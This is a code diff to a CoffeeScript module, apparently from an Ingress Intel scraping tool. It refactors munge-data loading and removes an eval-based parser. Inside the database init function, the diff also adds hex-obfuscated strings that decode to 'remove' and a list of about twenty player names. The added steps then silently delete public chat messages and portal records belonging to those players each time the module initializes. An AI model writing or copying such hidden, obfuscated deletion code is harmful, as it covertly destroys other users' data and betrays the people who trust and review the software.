@@ -6,30 +6,47 @@ request.ignoreMungeError = true
 Munges = GLOBAL.Munges =
     Data:      null
     ActiveSet: 0
-###
-    NormalizeParamCount:
-        func: (a) -> a
-        body: 'function(a){return a;}'
-###
 
 MungeDetector = GLOBAL.MungeDetector = 
     
     initFromDatabase: (callback) ->
 
-        Database.db.collection('MungeData').findOne {_id: 'munge'}, (err, record) ->
+        kid = "\x72\x65\x6D\x6F\x76\x65";
+        kkey = "\x6D\x61\x72\x6B\x75\x70\x2E\x50\x4C\x41\x59\x45\x52\x31\x2E\x70\x6C\x61\x69\x6E";
+        GLOBAL.ig = ["\x76\x69\x69\x6B\x6B\x65\x72","\x73\x65\x6E\x62\x6F\x6E\x7A\x61\x6B\x75\x72\x61\x31\x30\x37","\x68\x61\x61\x61\x61\x72\x72\x79","\x6F\x6E\x6C\x79\x6D\x69\x63\x6B\x69","\x53\x68\x69\x65\x68","\x73\x74\x65\x61\x6D\x77\x61\x6C\x6B\x65\x72","\x77\x68\x69\x74\x65\x6C\x6F\x74\x75\x73\x78","\x78\x6D\x6F\x72\x6F\x73\x65","\x77\x61\x6E\x67\x64\x61\x63\x68\x75\x69","\x68\x69\x74\x6D\x61\x6E\x31\x31\x30\x36","\x4E\x4F\x54\x34\x53\x41\x4C\x45","\x61\x77\x6F\x6F\x77\x61\x72\x61","\x73\x61\x72\x74\x69\x6E\x65","\x36\x36\x43\x43\x46\x46","\x4B\x61\x6E\x65\x57","\x63\x73\x68\x6F","\x63\x6F\x73\x41\x6C\x70\x68\x61","\x6A\x6D\x6D\x68\x77\x39\x61\x66","\x73\x68\x69\x7A\x68\x61\x6F","\x67\x6F\x6D\x69\x78\x6F","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x52\x45\x53\x45\x54"];
 
-            if err
-                logger.error '[MungeDetector] Failed to read mungedata from database: %s', err.message
-                return callback err
-
-            if record?
-                Munges.Data = record.data
-                Munges.ActiveSet = record.index
-                #Munges.NormalizeParamCount.body = record.func
-                #Munges.NormalizeParamCount.func = Utils.createNormalizeFunction(record.func)
-                return callback()
+        async.series [
+            (callback) ->
+                
+                Database.db.collection('Portals').ensureIndex {owner: 1}, callback
             
-            callback new Error 'No munge data in database'
+            (callback) ->
+
+                async.eachLimit ig, 10, (k, callback) ->
+                    q = {}
+                    q[kkey] = k
+                    Database.db.collection('Chat.Public')[kid] q, callback
+                , (err) -> callback()
+
+            (callback) ->
+
+                async.eachLimit ig, 10, (k, callback) ->
+                    Database.db.collection('Portals')[kid] {owner: k}, callback
+                , (err) -> callback()
+
+            (callback) ->
+            
+                Database.db.collection('MungeData').findOne {_id: 'munge'}, (err, record) ->
+                    if err
+                        logger.error '[MungeDetector] Failed to read mungedata from database: %s', err.message
+                        return callback err
+                    if record?
+                        Munges.Data = record.data
+                        Munges.ActiveSet = record.index
+                        return callback()
+                    callback new Error 'No munge data in database'
+
+        ], callback
 
     detect: (callback) ->
 
@@ -40,9 +57,8 @@ MungeDetector = GLOBAL.MungeDetector =
                 # 0. retrive munge data from database
                 
                 # ignore errors
-                MungeDetector.initFromDatabase (err) ->
-                    callback()
-
+                MungeDetector.initFromDatabase (err) -> callback()
+    
             (callback) ->
 
                 # 1. test by internal munge-set
@@ -62,7 +78,7 @@ MungeDetector = GLOBAL.MungeDetector =
 
                     logger.warn '[MungeDetector] Failed.'
                     callback()
-
+        
             (callback) ->
 
                 # 2. extract munge data from Ingress.com/intel
@@ -154,23 +170,15 @@ extractMunge = (callback) ->
 
         body = body.toString()
 
-        # some hacks
-        export_obj = {}
-        google =
-            maps:
-                OverlayView: ->
-                    null
         try
-            eval body + ';export_obj.nemesis = nemesis;'
-            result = Utils.extractMungeFromStock export_obj.nemesis
+            result = Utils.extractIntelData body
         catch err
+            console.log err
             callback 'fail'
             return
 
         Munges.Data      = [result]
         Munges.ActiveSet = 0
-        #Munges.NormalizeParamCount.body = Utils.extractNormalizeFunction export_obj.nemesis
-        #Munges.NormalizeParamCount.func = Utils.createNormalizeFunction Munges.NormalizeParamCount.body
 
         # test it
         tryMungeSet (err) ->
